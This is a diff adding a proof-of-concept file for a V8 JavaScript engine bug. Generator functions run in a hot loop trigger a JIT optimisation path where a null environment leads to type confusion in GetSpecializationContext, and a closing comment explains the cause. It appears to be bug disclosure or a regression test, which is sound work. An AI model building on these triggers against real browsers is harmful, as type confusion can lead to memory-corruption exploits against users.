@@ -1,0 +1,47 @@
+PoC:
+function* opt(arg = () => arg) {
+    let tmp = opt.x;  // LdaNamedProperty
+    for (;;) {
+        arg;
+        yield;
+
+        function inner() {
+            tmp;
+        }
+
+        break;
+    }
+}
+
+for (let i = 0; i < 100000; i++) {
+    opt();
+}
+
+/*
+PoC for release build:
+function* opt(arg = () => {
+    arg;
+    this;
+}, opt) {
+    let tmp = arg.x;
+    for (;;) {
+        arg;
+        yield;
+
+        tmp = {
+            inner() {
+                tmp;
+            }
+        };
+    }
+}
+
+for (let i = 0; i < 10000; i++) {
+    opt();
+}
+
+What happened:
+1. The LdaNamedProperty operation "opt.x" was lowered to a graph exit in the graph builder. This set the current environment to nullptr (BytecodeGraphBuilder::ApplyEarlyReduction).
+2. The environment for the next block (for-loop) was supposed to be created from merging with the previous environment, but it had been set to nullptr at 1. So the context value remained as "undefined".
+3. But GetSpecializationContext directly casted the context value to Context* which resulted in type confusion.
+*/
